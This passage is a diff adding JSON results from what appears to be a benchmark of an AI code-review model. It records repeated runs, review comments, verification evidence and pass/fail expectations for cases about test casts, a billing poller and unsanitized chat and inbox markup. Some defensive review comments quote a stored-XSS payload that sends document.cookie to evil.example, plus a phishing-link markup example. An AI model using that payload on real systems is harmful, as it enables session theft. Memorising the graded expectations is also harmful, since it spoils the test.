+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-test-absent-no-cast"
+          ],
+          "marked": false,
+          "file": "src/pricing/quote.test.ts",
+          "line": 25,
+          "text": "The `undefined as unknown as Coupon` double cast hides the real type of `quote.appliedCoupon`, so the test would not catch a change in that field's type and it violates the \"Assert absent values without casts\" rule. Assert absence directly with `expect(quote.appliedCoupon).toBeUndefined()` (or `toBeNull()` if the field is nullable)."
+        }
+      ],
+      "claims": [
+        {
+          "id": "absent-cast-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "absent-cast-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P07-rule-absent-assert-cast-rewritten",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 17801,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/pricing/quote.test.ts",
+          "line": 15,
+          "label": "kody_rules",
+          "earlierId": "round-a-P07-rule-absent-assert-cast-rewritten",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-test-absent-no-cast"
+          ],
+          "marked": false,
+          "file": "src/pricing/quote.test.ts",
+          "line": 25,
+          "text": "Casting the expected value with `undefined as unknown as Coupon` violates rule 21 and hides the real type of `quote.appliedCoupon`, so the test would keep compiling and lose its ability to catch a field type change. Assert absence directly with `expect(quote.appliedCoupon).toBeUndefined()` (or `toBeNull()` if the field is null)."
+        }
+      ],
+      "claims": [
+        {
+          "id": "absent-cast-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "absent-cast-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P07-rule-absent-assert-cast-rewritten",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 17883,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/pricing/quote.test.ts",
+          "line": 15,
+          "label": "kody_rules",
+          "earlierId": "round-a-P07-rule-absent-assert-cast-rewritten",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P07-rule-absent-assert-cast-rewritten",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-test-absent-no-cast"
+          ],
+          "marked": false,
+          "file": "src/pricing/quote.test.ts",
+          "line": 25,
+          "text": "Casting with `undefined as unknown as Coupon` violates the 'Assert absent values without casts' rule and suppresses type checking of the absence, so the test would keep compiling and stop catching a type change to `appliedCoupon`. Assert the absence directly with `expect(quote.appliedCoupon).toBeUndefined()`, or `toBeNull()` if the field is null rather than undefined."
+        }
+      ],
+      "claims": [
+        {
+          "id": "absent-cast-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "absent-cast-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P07-rule-absent-assert-cast-rewritten",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 15968,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "src/pricing/quote.test.ts",
+          "line": 15,
+          "label": "kody_rules",
+          "earlierId": "round-a-P07-rule-absent-assert-cast-rewritten",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P07-rule-absent-assert-cast-rewritten",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-test-absent-no-cast"
+          ],
+          "marked": false,
+          "file": "src/pricing/quote.test.ts",
+          "line": 25,
+          "text": "Casting the expected value with `undefined as unknown as Coupon` hides the real type of `quote.appliedCoupon` and keeps the check compiling even if the field changes type, so the test can no longer catch that, contrary to the rule \"Assert absent values without casts\". Assert absence on the value as it is with `expect(quote.appliedCoupon).toBeUndefined()`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "absent-cast-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "absent-cast-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P17-rule-partial-fixture-label-comment",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 4159,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "spec/billing/late_fee_calculator_spec.rb",
+          "line": 17,
+          "label": "kody_rules",
+          "earlierId": "round-a-P17-rule-partial-fixture-label-comment",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "partial-fixture-comment-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P17-rule-partial-fixture-label-comment",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 3169,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "spec/billing/late_fee_calculator_spec.rb",
+          "line": 17,
+          "label": "kody_rules",
+          "earlierId": "round-a-P17-rule-partial-fixture-label-comment",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "partial-fixture-comment-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P17-rule-partial-fixture-label-comment",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 3526,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "spec/billing/late_fee_calculator_spec.rb",
+          "line": 17,
+          "label": "kody_rules",
+          "earlierId": "round-a-P17-rule-partial-fixture-label-comment",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "partial-fixture-comment-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P17-rule-partial-fixture-label-comment",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 3444,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "spec/billing/late_fee_calculator_spec.rb",
+          "line": 17,
+          "label": "kody_rules",
+          "earlierId": "round-a-P17-rule-partial-fixture-label-comment",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "partial-fixture-comment-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P17-rule-partial-fixture-label-comment",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 3056,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "spec/billing/late_fee_calculator_spec.rb",
+          "line": 17,
+          "label": "kody_rules",
+          "earlierId": "round-a-P17-rule-partial-fixture-label-comment",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "partial-fixture-comment-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P27-poller-first-page-only",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 77881,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/poller.ts",
+          "claim": "WHAT: handleEvent is awaited inside the loop with no error handling, so any rejection from invoices.markPaid/markVoided/markPastDue aborts pollOnce before cursors.set(CURSOR_KEY, pollStartedAt) runs. WHY: the cursor never advances, so the next tick re-reads the identical window and replays every already-processed event; a single event whose handler deterministically throws permanently wedges the poller (all later events are starved) and repeatedly re-applies the prefix. HOW: isolate each event so one failure cannot block cursor advancement, e.g. wrap the handleEvent call in try/catch (log and continue), or record the last successfully processed event id and set the cursor to it in a finally block.",
+          "keep": true,
+          "rationale": "Confirmed: line 13 awaits handleEvent with no error isolation, so any rejection from markPaid/markVoided/markPastDue throws out of pollOnce before cursors.set(CURSOR_KEY, pollStartedAt) at line 17 executes. The cursor then never advances, so the next tick re-reads the identical window and replays processed events; a deterministically-throwing event permanently wedges the poller. This is a distinct failure from PreviousDecision index 1 (which was about pagination loss / only the first page being read), so it is not a repeat — different root cause and different consequence. Not refutable from the code.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 20,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "file": "src/billing/poller.ts",
+          "line": 12,
+          "text": "In `src/billing/poller.ts`, awaiting `handleEvent` inside the loop without error handling means any rejection from `invoices.markPaid`/`markVoided`/`markPastDue` aborts `pollOnce` before `cursors.set(CURSOR_KEY, pollStartedAt)` runs, so the cursor never advances and the next tick re-reads the identical window, replaying every processed event; a deterministically throwing event permanently wedges the poller and starves all later events. Isolate each event so one failure cannot block cursor advancement, e.g. wrap the `handleEvent` call in `try`/`catch` to log and continue, or record the last successfully processed event id and set the cursor to it in a `finally` block."
+        }
+      ],
+      "claims": [
+        {
+          "id": "poller-one-page-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P27-poller-first-page-only",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 39344,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/poller.ts",
+          "claim": "WHAT: pollOnce reads only one page and then advances the cursor to pollStartedAt, while the comment at lines 15-16 falsely asserts that with PAGE_SIZE=500 `page.hasMore` is never true. WHY: the EventsClient contract (events-client.ts:16-17) states the provider caps limit at 100, so limit:500 still returns at most 100 events and hasMore/nextCursor remain meaningful; whenever more than 100 events exist since the stored cursor, the rest are never fetched and the cursor jumps past them, permanently losing invoice.paid/voided/payment_failed events (invoices never marked paid/voided/past-due). HOW: follow nextCursor until hasMore is false before advancing the cursor, e.g. `let cursor: string | undefined; let page; do { page = await client.listEvents({ createdAfter: since, createdBefore: pollStartedAt, limit: PAGE_SIZE, cursor }); for (const event of page.data) await handleEvent(invoices, event); cursor = page.nextCursor ?? undefined; } while (page.hasMore);` then `await cursors.set(CURSOR_KEY, pollStartedAt);`.",
+          "keep": false,
+          "rationale": "The candidate describes the exact same failure as PreviousDecision index 1 (round-a-P27-poller-first-page-only): pollOnce reads one page, then advances the cursor to pollStartedAt, losing invoice events when more than one page exists. It only re-attributes the cause (provider caps limit at 100, so PAGE_SIZE=500 still returns ≤100 and hasMore stays true). The failure — same data loss in the same operation at the same location — is a repeat of the already-posted suggestion, so it must be dropped regardless of the entry's Outcome or the new cause named.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "limit|hasMore|nextCursor|caps|100",
+                "path": "src/billing/events-client.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 12,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "poller-one-page-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P27-poller-first-page-only",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 34587,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "poller-one-page-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P27-poller-first-page-only",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 34963,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "poller-one-page-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P27-poller-first-page-only",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 41403,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/poller.ts",
+          "claim": "WHAT: pollOnce still reads only one page and then advances the cursor to pollStartedAt; the new comment claims `page.hasMore is never true` because PAGE_SIZE=500, but EventsClient.listEvents documents (events-client.ts:16) that the provider caps limit at 100, so a 500 limit still returns at most 100 events. WHY: when more than 100 events exist in the [since, pollStartedAt) window, page.hasMore is true and page.nextCursor points to the remainder; pollOnce ignores both and moves the cursor to pollStartedAt, so the unread invoice events are skipped forever (invoices never marked paid/voided/past due). HOW: follow the cursor — loop while page.hasMore, passing page.nextCursor as `cursor`, and only then set the cursor to pollStartedAt; the PAGE_SIZE comment should be removed since it does not raise the effective page size.",
+          "keep": false,
+          "rationale": "The candidate's failure — pollOnce reads a single page, then advances the cursor to pollStartedAt, so when page.hasMore is true the remaining events are never read and invoice events are lost — is exactly the failure PreviousReviewDecisions entry round-a-P27-poller-first-page-only already raised on this same PR (same file, same lines, same fix: follow page.nextCursor until hasMore is false before advancing the cursor). Per the instructions, re-raising the problem an entry already raised is a DROP, even when it blames a new cause (the provider capping limit at 100 vs PAGE_SIZE=500) and even though the comment now claims hasMore is never true — that is a new justification, not a new failure. The entry's Outcome is \"implemented\"; the current diff only shows a comment claiming the bug cannot happen, with no concrete evidence the applied fix was reverted. Same crash/data-loss in the same operation = repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "listEvents|hasMore|nextCursor|limit",
+                "glob": "events-client.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/events-client.ts",
+                "startLine": 1,
+                "endLine": 25
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "poller-one-page-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 56935,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body into chat markup without stripInlineMarkup, and mentionInbox interpolates the same raw user input into html. WHY: a commenter can post a body containing <!channel> (mass-ping) or <https://evil.example|Reset password> which renders as a live link in chat, and raw HTML in the inbox item is rendered as is (clients.ts:11), giving stored HTML/markup injection. HOW: wrap both values with stripInlineMarkup as mentionEmail already does, e.g. text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}` and html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`.",
+          "keep": true,
+          "rationale": "Confirmed: mentionEmail already sanitizes with stripInlineMarkup, but mentionChat (line 22) and mentionInbox (line 28) interpolate raw m.authorName/m.body. clients.ts documents that chat text interprets <!channel> and <url|label> markup and that inbox html is rendered as-is, so raw user input yields mass-ping/link injection and stored HTML injection. The previous decision only covered mentionEmail's subject/body; these are different sinks/operations, not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 12,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "text": "Because `mentionChat` interpolates `m.authorName` and `m.body` into chat markup without `stripInlineMarkup` and `mentionInbox` interpolates the same raw input into `html`, a commenter can post a body containing `<!channel>` for a mass-ping or `<https://evil.example|Reset password>` to render a live link in chat, while raw HTML in the inbox item is rendered as is (`clients.ts:11`), allowing stored HTML/markup injection. Wrap both values with `stripInlineMarkup` as `mentionEmail` already does in both the `text` and `html` fields."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 62927,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox writes m.authorName and m.body unescaped into the inbox item's `html`, which clients.ts:11 documents is rendered as-is in the web app. WHY: an attacker-controlled comment body such as `<img src=x onerror=fetch('https://evil.example/'+document.cookie)>` executes in the victim's authenticated inbox session (stored XSS). HOW: HTML-escape (or stripInlineMarkup, as the sibling email sink does) both values before building the html string.",
+          "keep": true,
+          "rationale": "Confirmed. mentions.ts:28 interpolates m.authorName and m.body directly into the inbox item's html with no escaping, and clients.ts:11 documents that this html is rendered as-is in the web app. The sibling email sink (line 16) applies stripInlineMarkup, showing the intended sanitization; mentionInbox omits it, enabling stored XSS via attacker-controlled comment content. The prior decision targeted mentionEmail (a different sink/operation), so this is a distinct unaddressed problem, not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body into the chat message text without stripInlineMarkup, unlike mentionEmail which sanitizes both. WHY: ChatClient.post (clients.ts:6-7) documents that `text` renders chat markup, so a comment body containing `<!channel>` pings the whole channel and `<https://evil.example|Reset password>` renders a live phishing link from our bot — the exact threats stripInlineMarkup (sanitize.ts) exists to strip. HOW: wrap both values, e.g. `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``.",
+          "keep": true,
+          "rationale": "Confirmed: mentions.ts:22 interpolates m.authorName and m.body directly into the chat text, while mentionEmail (lines 15-16) passes both through stripInlineMarkup. sanitize.ts documents that chat markup like <!channel> and <https://evil.example|Reset password> is exactly what stripInlineMarkup strips, and clients.ts:7 confirms ChatClient.post takes a `text` field that renders chat markup. The claim's root cause and failure path hold. Note: PreviousDecision round-a-P37 covered mentionEmail (the email sink), not mentionChat — this is a separate operation/sink, so it is a distinct problem, not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "ChatClient|post\\(",
+                "path": "src/notifications"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 18,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "text": "Because `mentionChat` interpolates `m.authorName` and `m.body` without `stripInlineMarkup`, unlike `mentionEmail`, a comment body containing `<!channel>` pings the whole channel and `<https://evil.example|Reset password>` renders a live phishing link from our bot, since `ChatClient.post` (clients.ts:6-7) documents that `text` renders chat markup. Wrap both values in `stripInlineMarkup` before building the message, as in `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}`."
+        },
+        {
+          "sourceIndex": 1,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "text": "Because `mentionInbox` writes `m.authorName` and `m.body` unescaped into the inbox item's `html`, which clients.ts:11 documents as rendered as-is in the web app, an attacker-controlled comment body such as `<img src=x onerror=fetch('https://evil.example/'+document.cookie)>` executes in the victim's authenticated inbox session (stored XSS). HTML-escape both values (or use `stripInlineMarkup`, as the sibling email sink does) before building the html string."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "high",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 79316,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
